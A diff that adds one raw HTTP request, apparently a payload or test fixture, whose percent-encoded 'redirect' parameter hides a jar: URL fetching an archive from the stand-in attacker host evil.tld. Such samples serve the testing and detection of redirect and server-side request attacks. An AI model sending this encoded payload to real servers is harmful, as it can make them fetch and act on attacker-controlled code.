@@ -1,0 +1,4 @@
+GET /a?redirect=%6A%61%72%3A%68%74%74%70%3A%2F%2F%65%76%69%6C%2E%74%6C%64%2F%78%2E%6A%61%72%21%2F%63%6D%64%2E%74%78%74 HTTP/1.1
+Host: demo.example.com
+Connection: close
+
